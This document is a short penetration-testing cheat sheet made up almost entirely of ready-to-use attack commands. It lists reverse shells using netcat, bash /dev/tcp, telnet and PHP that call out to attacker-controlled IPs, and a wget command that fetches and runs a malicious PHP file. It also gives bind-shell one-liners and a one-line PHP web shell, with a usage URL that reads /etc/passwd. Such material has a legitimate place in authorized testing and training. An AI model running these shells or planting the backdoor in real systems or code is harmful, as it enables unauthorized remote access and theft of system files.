# Pentest-note


## Contents

- [Shell](#shell)
    - [Reverse Shell](#reverse-shell)
    - [Bind Shell](#bind-shell)
    - [Web Shell](#web-shell)

- [Command snippets](#command-snippets)




## Shell

#### Reverse Shell

Windows :

```bash
nc IP PORT -e cmd.exe
```

Listener:

```bash
nc -nlvp PORT
```

Linux :

```bash
bash -i >& /dev/tcp/10.11.0.0/31337 0>&1
```

```bash
nc -e /bin/sh 10.11.0.0 31337
```

Telnet reverse shell:

```bash
telnet 10.11.0.xxx 31337 | /bin/bash | telnet 10.11.0.xxx 31338
```

```bash
rm -f /tmp/p; mknod /tmp/p p && telnet 10.11.0.xxx 31337 0/tmp/p
```

Php reverse shell:

```php
<?php echo shell_exec ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacking IP port >/tmp/f');?>

Usage:

<?php echo shell_exec ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.xx 80 >/tmp/f');?>

```

```php
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```php
wget -O /tmp/bd.php <url_to_malicious_file> && php -f /tmp/bd.php
```

More: 

http://pentestmonkey.net/tools/web-shells/php-reverse-shell

http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

https://gist.github.com/sckalath/67a59eb4955f1f9aedde

https://gist.github.com/sckalath/89590ef81557f3a87ef0

#### Bind Shell

```bash
nc IP PORT

nc -nlvp PORT  -e cmd.exe
```

```python
python -c 'import pty; pty.spawn("/bin/sh")'
```

for some case, sh is better than bash 



#### Web Shell

One line php webshell (windows and linux ok) :

```php
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>

Usage:
http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

```



https://gist.github.com/sckalath/8b8fe29ee5489eaefda1
